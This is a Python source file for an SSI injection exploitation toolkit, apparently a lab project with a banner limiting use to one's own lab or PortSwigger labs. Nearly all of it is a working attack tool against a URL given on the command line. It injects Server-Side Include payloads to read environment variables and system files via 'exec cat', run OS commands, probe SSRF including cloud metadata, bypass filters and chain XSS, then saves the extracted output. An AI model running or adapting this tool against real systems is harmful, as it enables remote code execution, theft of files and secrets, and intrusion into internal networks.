#!/usr/bin/env python3
"""
ssi_toolkit.py — SSI Injection Exploitation Toolkit (Project #44)
Two-step lab: submit payload to CGI → view rendered .shtml

LEGAL: only test your own lab or PortSwigger labs.
"""

import argparse
import json
import os
import time
from datetime import datetime
from urllib.parse import quote

import requests

import ssi_payloads as P

REPORTS_DIR = "reports"
EXTRACTED_DIR = "extracted"
DEFAULT_TIMEOUT = 10

class Colors:
    GREEN  = "\033[92m"
    RED    = "\033[91m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    RESET  = "\033[0m"
    BOLD   = "\033[1m"

class SSIToolkit:
    def __init__(self, submit_url, view_url, timeout=DEFAULT_TIMEOUT):
        """
        submit_url: e.g. http://127.0.0.1/cgi-bin/submit.cgi
        view_url:   e.g. http://127.0.0.1/comment.shtml
        """
        self.submit_url = submit_url
        self.view_url = view_url
        self.timeout = timeout

        os.makedirs(REPORTS_DIR, exist_ok=True)
        os.makedirs(EXTRACTED_DIR, exist_ok=True)

        self.report = {
            "submit_url": submit_url,
            "view_url": view_url,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "phases": {},
        }

    # ------------------------------------------------------------------
    def _inject(self, payload):
        """
        Submit payload → view rendered result.
        Returns (status, rendered_body).
        """
        try:
            # 1. Submit via POST (avoids + encoding issue with GET)
            r1 = requests.post(
                self.submit_url,
                data={"comment": payload},
                timeout=self.timeout,
            )
            # 2. View rendered file
            r2 = requests.get(self.view_url, timeout=self.timeout)
            return r2.status_code, r2.text
        except requests.exceptions.Timeout:
            return None, "[TIMEOUT]"
        except Exception as e:
            return None, f"[ERROR] {type(e).__name__}: {e}"

    def _check(self, body, indicators):
        if not body:
            return False, None
        for ind in indicators:
            if ind and ind in body:
                return True, ind
        return False, None

    # ------------------------------------------------------------------
    # PHASE 1 — Detection
    # ------------------------------------------------------------------
    def phase1_detection(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 1] SSI DETECTION{Colors.RESET}")
        results = {}

        tests = [
            ("echo_date",    P.DETECTION_PAYLOADS["echo_date"],    P.INDICATORS["echo_date"]),
            ("exec_id",      P.DETECTION_PAYLOADS["exec_id"],      P.INDICATORS["exec_id"]),
            ("exec_whoami",  P.DETECTION_PAYLOADS["exec_whoami"],  P.INDICATORS["exec_whoami"]),
            ("include_secret",P.DETECTION_PAYLOADS["include_secret"],P.INDICATORS["flag"]),
        ]

        for name, payload, inds in tests:
            print(f"\n  [{name.upper()}] {payload[:60]}")
            status, body = self._inject(payload)
            hit, ind = self._check(body, inds)
            if hit:
                print(f"    {Colors.GREEN}[+] CONFIRMED!{Colors.RESET} ({ind})")
                print(f"    Preview: {body[:150].strip()}")
            else:
                print(f"    {Colors.YELLOW}[-] no indicator{Colors.RESET}")
            results[name] = {
                "confirmed": hit,
                "indicator": ind,
                "snippet": (body or "")[:300],
            }

        self.report["phases"]["detection"] = results

    # ------------------------------------------------------------------
    # PHASE 2 — Data extraction
    # ------------------------------------------------------------------
    def phase2_data_extraction(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 2] DATA EXTRACTION{Colors.RESET}")

        # Env
        print(f"\n    [ENV_VARS]")
        env_findings = {}
        for var in P.ENV_VARS:
            payload = P.echo_payload(var)
            status, body = self._inject(payload)
            if body and payload not in body and 0 < len(body) < 500:
                print(f"      {Colors.GREEN}{var}{Colors.RESET} = {body[:80].strip()}")
                env_findings[var] = body[:500].strip()
        self.report["phases"]["env_extraction"] = env_findings

        # Files via include virtual (web root)
        print(f"\n    [FILES via include virtual]")
        file_findings = []
        for path in P.FILE_TARGETS_VIRTUAL:
            payload = P.include_virtual_payload(path)
            status, body = self._inject(payload)
            hit, ind = self._check(body,
                P.INDICATORS["flag"] + P.INDICATORS["file_hosts"])
            if hit:
                print(f"      {Colors.GREEN}[+] {path} -> {ind}{Colors.RESET}")
                safe = path.replace("/", "_").strip("_")
                with open(f"{EXTRACTED_DIR}/{safe}.txt", "w") as f:
                    f.write(body)
            else:
                print(f"      {Colors.YELLOW}[-] {path}{Colors.RESET}")
            file_findings.append({
                "path": path, "method": "include_virtual",
                "found": hit, "snippet": (body or "")[:300],
            })

        # Files via exec cat (bypasses include restriction)
        print(f"\n    [FILES via exec cat]")
        for path in P.FILE_TARGETS_VIA_EXEC:
            payload = P.exec_payload(f"cat {path}")
            status, body = self._inject(payload)
            hit, ind = self._check(body, P.INDICATORS["file_passwd"])
            # Loosen check: any non-error, non-empty body is meaningful
            if not hit and body and "an error occurred" not in body.lower():
                if len(body.strip()) > 5 and "comment saved" not in body.lower():
                    hit = True
                    ind = "content"
            if hit:
                print(f"      {Colors.GREEN}[+] {path} -> {ind}{Colors.RESET}")
                safe = path.replace("/", "_").strip("_")
                with open(f"{EXTRACTED_DIR}/exec_{safe}.txt", "w") as f:
                    f.write(body)
            else:
                print(f"      {Colors.YELLOW}[-] {path}{Colors.RESET}")
            file_findings.append({
                "path": path, "method": "exec_cat",
                "found": hit, "snippet": (body or "")[:300],
            })

        self.report["phases"]["file_extraction"] = file_findings

        # Commands
        print(f"\n    [COMMANDS via exec]")
        cmd_findings = []
        for cmd in P.COMMANDS:
            payload = P.exec_payload(cmd)
            status, body = self._inject(payload)
            hit, ind = self._check(body,
                P.INDICATORS["exec_id"] + P.INDICATORS["exec_whoami"]
                + P.INDICATORS["exec_uname"] + P.INDICATORS["file_hosts"])
            if hit:
                print(f"      {Colors.RED}[+] {cmd} -> {ind}{Colors.RESET}")
                print(f"          {body[:100].strip()}")
            else:
                print(f"      {Colors.YELLOW}[-] {cmd}{Colors.RESET}")
            cmd_findings.append({
                "command": cmd, "executed": hit,
                "snippet": (body or "")[:300],
            })
        self.report["phases"]["command_execution"] = cmd_findings

    # ------------------------------------------------------------------
    # PHASE 3 — SSRF via SSI
    # ------------------------------------------------------------------
    def phase3_ssrf(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 3] SSRF VIA SSI{Colors.RESET}")
        results = {}
        for name, url in P.SSRF_TARGETS.items():
            print(f"\n    [{name.upper()}] {url}")
            payload = P.include_virtual_payload(url)
            status, body = self._inject(payload)
            hit, ind = self._check(body,
                P.INDICATORS["flag"] + P.INDICATORS["file_hosts"]
                + ["ami-id", "instance-id"])
            if hit:
                print(f"      {Colors.GREEN}[+] SSRF SUCCESS ({ind}){Colors.RESET}")
                print(f"      Preview: {body[:100].strip()}")
            else:
                print(f"      {Colors.YELLOW}[-] no SSRF response{Colors.RESET}")
            results[name] = {
                "url": url, "hit": hit, "snippet": (body or "")[:300],
            }
        self.report["phases"]["ssrf"] = results

    # ------------------------------------------------------------------
    # PHASE 4 — RCE via SSI
    # ------------------------------------------------------------------
    def phase4_rce(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 4] RCE VIA SSI{Colors.RESET}")
        results = {}
        for cmd in ["whoami", "id", "uname -a", "pwd"]:
            print(f"\n    [EXEC] {cmd}")
            payload = P.exec_payload(cmd)
            status, body = self._inject(payload)
            hit, ind = self._check(body,
                P.INDICATORS["exec_id"] + P.INDICATORS["exec_whoami"]
                + P.INDICATORS["exec_uname"])
            if hit:
                print(f"      {Colors.RED}[+] RCE CONFIRMED! ({ind}){Colors.RESET}")
                print(f"      Output: {body[:100].strip()}")
            else:
                print(f"      {Colors.YELLOW}[-] no output{Colors.RESET}")
            results[cmd] = {"executed": hit, "snippet": (body or "")[:300]}
        self.report["phases"]["rce"] = results

    # ------------------------------------------------------------------
    # PHASE 5 — Filter bypass
    # ------------------------------------------------------------------
    def phase5_filter_bypass(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 5] FILTER BYPASS{Colors.RESET}")
        results = {}
        for name, payload in P.bypass_payloads().items():
            print(f"\n    [{name}]")
            status, body = self._inject(payload)
            hit, ind = self._check(body, P.INDICATORS["echo_date"])
            if hit:
                print(f"      {Colors.GREEN}[+] BYPASSED! ({ind}){Colors.RESET}")
            else:
                print(f"      {Colors.YELLOW}[-] blocked{Colors.RESET}")
            results[name] = {
                "payload": payload, "bypassed": hit,
                "snippet": (body or "")[:200],
            }
        self.report["phases"]["filter_bypass"] = results

    # ------------------------------------------------------------------
    # PHASE 6 — XSS chaining
    # ------------------------------------------------------------------
    def phase6_xss(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 6] XSS CHAINING{Colors.RESET}")
        results = {}
        print(f"\n    [XSS_SSI]")
        payload = P.xss_payload("<script>alert(1)</script>")
        status, body = self._inject(payload)
        hit = bool(body) and "<script>alert(1)</script>" in body
        if hit:
            print(f"      {Colors.GREEN}[+] XSS confirmed!{Colors.RESET}")
        else:
            print(f"      {Colors.YELLOW}[-] not reflected{Colors.RESET}")
        results["xss_basic"] = {"hit": hit, "snippet": (body or "")[:300]}
        self.report["phases"]["xss"] = results

    # ------------------------------------------------------------------
    # PHASE 7 — Report
    # ------------------------------------------------------------------
    def _collect_confirmed(self):
        confirmed = []
        for phase, data in self.report["phases"].items():
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, dict):
                        if (v.get("confirmed") or v.get("hit")
                                or v.get("found") or v.get("executed")
                                or v.get("bypassed")):
                            confirmed.append(f"{phase}.{k}")
                    elif isinstance(v, list):
                        for item in v:
                            if isinstance(item, dict) and (
                                item.get("found") or item.get("executed")
                                or item.get("hit")
                            ):
                                label = (item.get("path")
                                         or item.get("command")
                                         or item.get("url", "?"))
                                confirmed.append(f"{phase}.{k}[{label}]")
        return confirmed

    def phase7_report(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 7] EXPLOITATION SUMMARY{Colors.RESET}")
        confirmed = self._collect_confirmed()
        print(f"\n    Total confirmed findings: {len(confirmed)}")
        for c in confirmed:
            print(f"      * {c}")

        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        json_path = f"{REPORTS_DIR}/ssi_report_{ts}.json"
        with open(json_path, "w") as f:
            json.dump(self.report, f, indent=2, default=str)
        print(f"\n    {Colors.GREEN}[OK] JSON: {json_path}{Colors.RESET}")

        html_path = f"{REPORTS_DIR}/ssi_report_{ts}.html"
        with open(html_path, "w") as f:
            f.write(self._build_html(confirmed))
        print(f"    {Colors.GREEN}[OK] HTML: {html_path}{Colors.RESET}")

    def _build_html(self, confirmed):
        rows = ""
        for phase, data in self.report["phases"].items():
            rows += f"<h3>{phase}</h3><pre>{json.dumps(data, indent=2, default=str)[:2500]}</pre>"
        return f"""<!DOCTYPE html><html><head><title>SSI Report</title>
<style>
body {{ font-family: monospace; background:#111; color:#eee; padding:20px; }}
h1 {{ color:#ff5555; }} h3 {{ color:#55ff55; border-bottom:1px solid #333; }}
pre {{ background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }}
</style></head><body>
<h1>SSI Injection Report</h1>
<p><b>Submit URL:</b> {self.submit_url}</p>
<p><b>View URL:</b> {self.view_url}</p>
<p><b>Timestamp:</b> {self.report['timestamp']}</p>
<p>Confirmed: {len(confirmed)}</p>
<ul>{''.join(f'<li>{c}</li>' for c in confirmed)}</ul>
{rows}
</body></html>"""

    def run_all(self):
        print("=" * 64)
        print("  SSI Injection Exploitation Toolkit - Project #44")
        print("=" * 64)
        print(f"[+] Submit URL: {self.submit_url}")
        print(f"[+] View URL  : {self.view_url}")
        self.phase1_detection()
        self.phase2_data_extraction()
        self.phase3_ssrf()
        self.phase4_rce()
        self.phase5_filter_bypass()
        self.phase6_xss()
        self.phase7_report()

def main():
    ap = argparse.ArgumentParser(description="SSI Injection Exploitation Toolkit")
    ap.add_argument("-s", "--submit", required=True,
                    help="Submit URL (e.g. http://127.0.0.1/cgi-bin/submit.cgi)")
    ap.add_argument("-v", "--view", required=True,
                    help="View URL (e.g. http://127.0.0.1/comment.shtml)")
    ap.add_argument("--timeout", type=int, default=10)
    args = ap.parse_args()

    toolkit = SSIToolkit(args.submit, args.view, args.timeout)
    toolkit.run_all()

if __name__ == "__main__":
    main()
